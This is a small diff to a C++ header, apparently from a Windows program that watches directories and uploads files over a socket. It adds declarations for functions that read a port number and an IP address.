@@ -53,6 +53,8 @@ VOID    ProcessDirectoryChange();
 //upload.cpp
 BOOL UploadFile(LPCWSTR filepath, LPCWSTR filename, SOCKET Socket);
 SOCKET GetSocket();
+unsigned short ReadPort();
+const char* ReadIP();
 
 //uploadlists.cpp
 VOID    InitUploadLists();
